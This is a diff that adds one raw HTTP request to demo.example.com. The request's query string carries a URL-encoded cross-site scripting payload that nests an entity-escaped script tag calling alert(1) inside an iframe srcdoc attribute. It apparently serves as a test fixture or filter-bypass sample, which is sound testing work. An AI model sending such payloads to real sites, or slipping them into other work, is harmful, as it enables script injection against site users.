@@ -1,0 +1,4 @@
+GET /a?q=%3Ciframe%2Bsrcdoc%3D%22%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B%22%3E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
